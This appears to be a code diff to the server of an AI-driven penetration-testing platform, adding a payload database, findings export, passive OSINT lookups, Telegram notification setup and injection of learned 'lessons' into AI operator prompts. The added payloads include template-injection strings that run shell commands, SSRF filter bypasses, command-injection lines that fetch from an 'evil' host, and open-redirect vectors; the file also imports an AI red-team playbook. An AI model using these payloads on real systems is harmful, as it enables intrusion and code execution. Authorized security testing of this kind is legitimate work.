@@ -28,7 +28,7 @@ import { detectLocalAgents, pingLocalAgent, runLocalAgent, syncLocalAgentSelecti
 import { FRONTIER_ARSENAL_MILESTONE, NETWORK_COMMANDS, SAFE_COMMANDS, TOOL_ADAPTERS, adapterForBinary, adaptersForFamily, summarizeToolCatalog } from './arsenal/catalog.js';
 import { AGENT_PROMPT_PACKS, FOREFRONT_PRESSURE_LANES, OPERATOR_RUNBOOKS, RESOURCE_PACKS, WORKFLOW_PRESETS, forefrontPressureForFamily, promptPacksForFamily, resourcesForFamily, runbookForFamily, searchResources, workflowPresetsForFamily } from './resources/index.js';
 import { AI_REDTEAM_PLAYBOOK, AI_REDTEAM_TECHNIQUE_IDS, aiRedTeamBriefing } from './resources/ai-redteam-playbook.js';
-import { OPERATOR_SYSTEM_PROMPTS, PLINIAN_OPERATOR_DOCTRINE, THE_FIXER_SYSTEM_PROMPT } from './prompts/index.js';
+import { OPERATOR_SYSTEM_PROMPTS, PLINIAN_OPERATOR_DOCTRINE, THE_FIXER_SYSTEM_PROMPT, resolveSystemPrompt } from './prompts/index.js';
 import { createTargetFromUrl, createTargetFromIP } from './target/index.js';
 import type { OperatorArchetype, LLMProvider } from './types/index.js';
 import { listOperatorPrompts, setOperatorOverride, resetOperatorOverride, type OperatorOverride } from './operators/index.js';
@@ -133,6 +133,31 @@ const PAYLOAD_DB = {
   xxe: {
     file_read: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
     ssrf: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>']
+  },
+  ssti_extra: {
+    freemarker: ['${7*7}', '${7*7}${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'],
+    velocity: ['#set($x=7*7)$x', '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))$rt.getRuntime().exec("id")'],
+    handlebars: ['{{7*7}}', '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this}}{{/with}}{{/with}}{{/with}}'],
+    nunjucks: ['{{7*7}}', '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}'],
+    jade_pug: ['#{7*7}', '= 7*7', '!= 7*7']
+  },
+  ssrf_bypass: {
+    decimal: ['http://2130706433/', 'http://3232235777/', 'http://2852039166/'],
+    hex_octal: ['http://0x7f000001/', 'http://0177.0.0.1/', 'http://0x7f.0x0.0x0.0x1/'],
+    unicode: ['http://127.0.0.1%00/', 'http://①②⑦.⓪.⓪.①/', 'http://%31%32%37.0.0.1/'],
+    redirects: ['http://127.0.0.1.nip.io/', 'http://localtest.me/', 'http://127.0.0.1:80@evil.com/', 'http://evil.com#@127.0.0.1/'],
+    ipv6: ['http://[::ffff:127.0.0.1]/', 'http://[::1]:80/']
+  },
+  cmdi_extra: {
+    separators: ['%0a id', '%0d%0a id', '`id` #', '| id #', '; id #', '&& id #', '|| id #', '$(id)'],
+    unix_special: ["id${IFS}", "id%09", "wget%20http://evil/", "curl%20http://evil/", "|/bin/sh|", "|telnet 127.0.0.1 4444|"],
+    windows_special: ['&cmd /c whoami', '%26%26whoami', '|powershell -nop -c whoami', '&certutil -urlcache -split -f http://evil/x']
+  },
+  open_redirect: {
+    protocol_relative: ['//evil.com', '///evil.com', '////evil.com'],
+    scheme_abuse: ['https://evil.com', 'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
+    encoded: ['/%2f%2fevil.com', '/%5cevil.com', '/%09/evil.com', '/%0d%0aLocation:%20//evil.com'],
+    backslash: ['/\\evil.com', '/..//evil.com', '/%2e%2e%2f%2fevil.com']
   }
 };
 
@@ -4233,7 +4258,7 @@ function buildPressureChains(params: Record<string, unknown>): Record<string, an
   }) as Record<string, any>;
 }
 
-function createMemoryProposal(input: Partial<MemoryProposal> & Record<string, unknown>): MemoryProposal {
+function createMemoryProposal(input: Partial<MemoryProposal> & Record<string, unknown>): MemoryProposal | null {
   const now = nowIso();
   const content = redactString(String(input.content || '').trim()).slice(0, 1200);
   const type = normalizeMemoryType(input.type);
@@ -4250,6 +4275,11 @@ function createMemoryProposal(input: Partial<MemoryProposal> & Record<string, un
       return rank(a) - rank(b) || b.updatedAt.localeCompare(a.updatedAt);
     });
   const duplicate = duplicateCandidates[0];
+  // REJECTION FEEDBACK: a lesson the operator already rejected must not keep
+  // resurfacing on every mission — respect the rejection and propose nothing.
+  if (duplicate && duplicate.status === 'rejected') {
+    return null;
+  }
   if (duplicate) {
     duplicate.fingerprint = fingerprint;
     duplicate.observationCount = Math.max(1, duplicate.observationCount || 1) + 1;
@@ -4325,7 +4355,7 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
   const proposals: MemoryProposal[] = [];
 
   if (evidence.length || findings.length || retests.length) {
-    proposals.push(createMemoryProposal({
+    const _mp1 = createMemoryProposal({
       type: 'procedure',
       content: `${family} missions should preserve traceability before promotion: ${evidence.length} evidence item(s), ${findings.length} finding(s), and ${passedRetests.length} passed retest(s) were linked in this run.`,
       source: 'learning.run_review',
@@ -4336,11 +4366,12 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       sourceEvidenceIds: evidence.map(entry => entry.id),
       sourceFindingIds: findings.map(finding => finding.id),
       sourceRetestIds: retests.map(retest => retest.id),
-    }));
+    });
+    if (_mp1) proposals.push(_mp1);
   }
 
   for (const finding of findings.filter(item => item.status === 'resolved' || item.confidence >= 0.8).slice(0, 4)) {
-    proposals.push(createMemoryProposal({
+    const _mp2 = createMemoryProposal({
       type: finding.family === 'ai_red_team' || finding.family === 'agent_warfare' ? 'boundary' : 'procedure',
       content: `${finding.family} lesson: ${finding.claim} Defensive artifact: ${finding.recommendedFix || 'attach fix guidance before promotion'}.`,
       source: 'learning.finding_review',
@@ -4351,12 +4382,13 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       sourceEvidenceIds: finding.evidenceIds,
       sourceFindingIds: [finding.id],
       sourceRetestIds: finding.retestIds,
-    }));
+    });
+    if (_mp2) proposals.push(_mp2);
   }
 
   for (const retest of passedRetests.slice(0, 4)) {
     const finding = findingsLedger.get(retest.findingId);
-    proposals.push(createMemoryProposal({
+    const _mp3 = createMemoryProposal({
       type: 'procedure',
       content: `Retest pattern to keep: ${retest.method} Acceptance criteria: ${retest.acceptanceCriteria.join('; ') || 'attach explicit criteria'}.`,
       source: 'learning.retest_review',
@@ -4367,11 +4399,12 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       sourceEvidenceIds: retest.evidenceIds,
       sourceFindingIds: [retest.findingId],
       sourceRetestIds: [retest.id],
-    }));
+    });
+    if (_mp3) proposals.push(_mp3);
   }
 
   if (!proposals.length) {
-    proposals.push(createMemoryProposal({
+    const _mp4 = createMemoryProposal({
       type: 'open_question',
       content: `No durable memory should be accepted yet for ${missionId || operationId || 'this run'} because no evidence/finding/retest chain was available.`,
       source: 'learning.run_review',
@@ -4379,7 +4412,8 @@ function buildLearningReview(input: Record<string, unknown>): { proposals: Memor
       rationale: 'The safest learning action is to name the missing receipts instead of inventing memory.',
       sourceMissionId: missionId || undefined,
       sourceOperationId: operationId || undefined,
-    }));
+    });
+    if (_mp4) proposals.push(_mp4);
   }
 
   return {
@@ -4491,9 +4525,12 @@ async function inspectToolAvailability(): Promise<Array<{ id: string; name: stri
     parserStatus: 'text' as const,
     notes: 'Repository context for local evidence and provenance.',
   }];
-  return Promise.all(adapters.map(async adapter => {
-    try {
-      const { stdout } = await execFileAsync('which', [adapter.binary], { timeout: 1500 });
+return Promise.all(adapters.map(async adapter => {
+try {
+// Windows has `where.exe`, POSIX has `which` — a bare `which` makes every
+// installed tool look missing on win32 (same fix as Arsenal.isToolAvailable).
+const probe = process.platform === 'win32' ? 'where' : 'which';
+const { stdout } = await execFileAsync(probe, [adapter.binary], { timeout: 1500 });
       return {
         id: adapter.id,
         name: adapter.binary,
@@ -5685,6 +5722,34 @@ app.get('/api/findings', (req: Request, res: Response) => {
   res.json(redactSecrets({ findings }));
 });
 
+// Findings export: CSV or raw JSON for reports / bug-bounty submissions.
+app.get('/api/findings/export', (req: Request, res: Response) => {
+  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
+  const format = typeof req.query.format === 'string' ? req.query.format.toLowerCase() : 'csv';
+  const findings = [...findingsLedger.values()]
+    .filter(finding => !missionId || finding.missionId === missionId)
+    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
+  const clean = findings.map((f) => ({
+    id: f.id, title: f.title, severity: f.severity, status: f.status, family: f.family,
+    target: f.target, claim: f.claim, confidence: f.confidence, recommendedFix: f.recommendedFix,
+    createdAt: f.createdAt, updatedAt: f.updatedAt,
+  }));
+  if (format === 'json') {
+    res.setHeader('Content-Type', 'application/json');
+    res.json(redactSecrets({ findings: clean }));
+    return;
+  }
+  const esc = (v: unknown): string => {
+    const s = String(v ?? '');
+    return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
+  };
+  const header = ['id', 'title', 'severity', 'status', 'family', 'target', 'claim', 'confidence', 'recommendedFix', 'createdAt', 'updatedAt'];
+  const rows = clean.map((f) => header.map((h) => esc((f as unknown as Record<string, unknown>)[h])).join(','));
+  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
+  res.setHeader('Content-Disposition', `attachment; filename="findings-${new Date().toISOString().slice(0, 10)}.csv"`);
+  res.send([header.join(','), ...rows].join('\r\n'));
+});
+
 app.post('/api/findings', (req: Request, res: Response) => {
   const body = req.body as Record<string, unknown>;
   if (rejectDuplicateLedgerId(res, findingsLedger, body.id, 'Finding', '/api/findings')) return;
@@ -6041,6 +6106,10 @@ app.post('/api/memory/proposals', (req: Request, res: Response) => {
     return;
   }
   const proposal = createMemoryProposal(body);
+  if (!proposal) {
+    res.status(200).json({ suppressed: true, reason: 'An identical lesson was previously rejected — respecting the operator decision.' });
+    return;
+  }
   res.status(201).json(proposal);
 });
 
@@ -6223,8 +6292,60 @@ app.post('/api/tools/recon', async (req: Request, res: Response): Promise<void> 
   res.json({ success: true, target: targetHost, scan_type, approvalId: guard.approval?.id || null, results: { dns, ports } });
 });
 
-app.get('/api/tools', (_req: Request, res: Response) => {
-  res.json({
+// Passive OSINT quick-look (direction-picker cards): runs ONE read-only OSINT
+// tool (username_search / telegram_lookup / email_format / ip_info) directly.
+// These are passive lookups of public data — no target network action, no
+// approval needed (the same posture as the MCP security_recon surface).
+const OSINT_QUICK_TOOLS = new Set(['username_search', 'telegram_lookup', 'email_format', 'ip_info']);
+app.post('/api/osint/quick', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body as Record<string, unknown>;
+  const toolName = String(body.tool || '').trim();
+  if (!OSINT_QUICK_TOOLS.has(toolName)) {
+    res.status(400).json({ error: `Unknown OSINT tool '${toolName}' (allowed: ${[...OSINT_QUICK_TOOLS].join(', ')})` });
+    return;
+  }
+  try {
+    const mod = await import('./arsenal/social-osint.js');
+    const tool = {
+      username_search: mod.usernameSearchTool,
+      telegram_lookup: mod.telegramLookupTool,
+      email_format: mod.emailFormatTool,
+      ip_info: mod.ipInfoTool,
+    }[toolName];
+    if (!tool) { res.status(400).json({ error: `Unknown OSINT tool '${toolName}'` }); return; }
+    const result = await tool.handler({
+      parameters: (body.parameters ?? {}) as Record<string, string | number | undefined>,
+      target: undefined as never,
+    });
+    res.json(redactSecrets({ success: true, tool: toolName, output: result.output, findings: result.findings ?? [] }));
+  } catch (e) {
+    res.status(500).json({ error: `osint quick-look failed: ${e instanceof Error ? e.message.slice(0, 200) : 'unknown'}` });
+  }
+});
+
+// Telegram: discover your chat id (message your bot first, then call this).
+app.get('/api/notify/chat-id', async (_req: Request, res: Response) => {
+  const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
+  if (!token) { res.status(400).json({ error: 'TELEGRAM_BOT_TOKEN not set' }); return; }
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates`, { signal: AbortSignal.timeout(10000) });
+    const j = (await r.json()) as { ok?: boolean; result?: { message?: { chat?: { id?: number; type?: string; first_name?: string } } }[] };
+    const chats = new Map<number, string>();
+    for (const u of j.result ?? []) {
+      const c = u.message?.chat;
+      if (c && c.id) chats.set(c.id, `${c.type}${c.first_name ? ' ' + c.first_name : ''}`);
+    }
+    if (chats.size) {
+      res.json({ ok: true, chats: [...chats.entries()].map(([id, name]) => ({ id, name })), hint: 'Set T3MP3ST_TG_CHAT_ID=<id> and restart to enable notifications.' });
+    } else {
+      res.json({ ok: false, hint: 'Message your bot first (any text), then call this endpoint again.' });
+    }
+  } catch (e) {
+    res.status(500).json({ error: `getUpdates failed: ${e instanceof Error ? e.message.slice(0, 120) : 'unknown'}` });
+  }
+});
+
+app.get('/api/tools', (_req: Request, res: Response) => {  res.json({
     success: true,
     tools: SAFE_COMMANDS,
     count: SAFE_COMMANDS.length,
@@ -6364,21 +6485,46 @@ app.post('/api/mission/start', async (req: Request, res: Response): Promise<void
       }
     }
 
-    // White-box wiring (OPTIONAL): if the caller passed a LOCAL repo path that
-    // exists on disk, ingest + security-rank it and feed the packed source into
-    // the command before it starts, so operators analyze real source you own
-    // rather than probing a black box. Reads LOCAL disk only — no network target.
-    let whitebox: { includedUnits: number; droppedUnits: number; stats: unknown; source: 'local' | 'github' } | undefined;
-    if (repoSource) {
-      const wb = ingestRepoToSourceContext(repoSource.repoPath);
-      // Only feed a NON-empty source (0 ingestable units → don't overwrite the operators'
-      // black-box view with an empty blob; the includedUnits:0 in the response signals it).
-      if (wb.sourceContext.trim()) cmd.setWhiteboxSource(wb.sourceContext);
-      whitebox = { includedUnits: wb.includedUnits, droppedUnits: wb.droppedUnits, stats: wb.stats, source: repoSource.source };
-    }
+      // White-box wiring (OPTIONAL): if the caller passed a LOCAL repo path that
+      // exists on disk, ingest + security-rank it and feed the packed source into
+      // the command before it starts, so operators analyze real source you own
+      // rather than probing a black box. Reads LOCAL disk only — no network target.
+      let whitebox: { includedUnits: number; droppedUnits: number; stats: unknown; source: 'local' | 'github' } | undefined;
+      if (repoSource) {
+        const wb = ingestRepoToSourceContext(repoSource.repoPath);
+        // Only feed a NON-empty source (0 ingestable units → don't overwrite the operators'
+        // black-box view with an empty blob; the includedUnits:0 in the response signals it).
+        if (wb.sourceContext.trim()) cmd.setWhiteboxSource(wb.sourceContext);
+        whitebox = { includedUnits: wb.includedUnits, droppedUnits: wb.droppedUnits, stats: wb.stats, source: repoSource.source };
+      }
 
-    // Start the command loop (auto-creates mission, auto-dispatches tasks)
-    cmd.start();
+      // ── SELF-LEARNING LOOP — lesson injection ───────────────────────────
+      // Accepted memory entries from previous hunts are appended to every
+      // operator's system prompt so the swarm hunts with prior knowledge:
+      // verified finding classes to chase, false-positive classes to skip,
+      // tools that worked. This closes the loop: mission → lesson → proposal →
+      // accept → injected into the NEXT mission.
+      if (memoryCapsule.size > 0) {
+        try {
+          const lessons = [...memoryCapsule.values()]
+            .sort((a, b) => (b.confidence ?? 0) - (a.confidence ?? 0))
+            .slice(0, 12)
+            .map((e) => `- [${e.type ?? 'lesson'}] ${String(e.content).slice(0, 300)}`)
+            .join('\n');
+          if (lessons.trim()) {
+            const lessonsBlock = `\n\n## LESSONS FROM PREVIOUS HUNTS (accepted memory)\nApply these when relevant:\n${lessons}`;
+            for (const archetype of validArchetypes) {
+              try {
+                const base = resolveSystemPrompt(archetype);
+                setOperatorOverride(archetype, { systemPrompt: base + lessonsBlock });
+              } catch { /* per-archetype best effort */ }
+            }
+          }
+        } catch { /* never break mission start on a lesson-injection failure */ }
+      }
+
+      // Start the command loop (auto-creates mission, auto-dispatches tasks)
+      cmd.start();
 
     broadcastEvent('mission:started', {
       name,
@@ -6586,9 +6732,22 @@ app.post('/api/operators/prompt', (req: Request, res: Response): void => {
     return;
   }
   setOperatorOverride(archetype as OperatorArchetype, override);
-  broadcastEvent('operator:prompt_updated', { archetype, hasPrompt: override.systemPrompt !== undefined, hasParams: !!override.params });
+  const application = getTempestCommand()?.cell.refreshOperatorProfiles(archetype as OperatorArchetype) || {
+    policy: 'idle-now-active-next-task' as const,
+    revision: listOperatorPrompts().find(o => o.archetype === archetype)?.revision || 0,
+    appliedOperatorIds: [],
+    deferredOperatorIds: [],
+    futureSpawns: true as const,
+  };
   const updated = listOperatorPrompts().find(o => o.archetype === archetype);
-  res.json({ ok: true, archetype, operator: updated });
+  broadcastEvent('operator:prompt_updated', {
+    archetype,
+    hasPrompt: override.systemPrompt !== undefined,
+    hasParams: !!override.params,
+    capabilityDiagnostics: updated?.capabilityDiagnostics || [],
+    application,
+  });
+  res.json({ ok: true, archetype, operator: updated, application });
 });
 
 app.post('/api/operators/prompt/reset', (req: Request, res: Response): void => {
@@ -6598,9 +6757,21 @@ app.post('/api/operators/prompt/reset', (req: Request, res: Response): void => {
     return;
   }
   resetOperatorOverride(archetype as OperatorArchetype);
-  broadcastEvent('operator:prompt_updated', { archetype, reset: true });
+  const application = getTempestCommand()?.cell.refreshOperatorProfiles(archetype as OperatorArchetype) || {
+    policy: 'idle-now-active-next-task' as const,
+    revision: listOperatorPrompts().find(o => o.archetype === archetype)?.revision || 0,
+    appliedOperatorIds: [],
+    deferredOperatorIds: [],
+    futureSpawns: true as const,
+  };
   const updated = listOperatorPrompts().find(o => o.archetype === archetype);
-  res.json({ ok: true, archetype, operator: updated });
+  broadcastEvent('operator:prompt_updated', {
+    archetype,
+    reset: true,
+    capabilityDiagnostics: updated?.capabilityDiagnostics || [],
+    application,
+  });
+  res.json({ ok: true, archetype, operator: updated, application });
 });
 
 app.post('/api/operators/spawn', (req: Request, res: Response): void => {
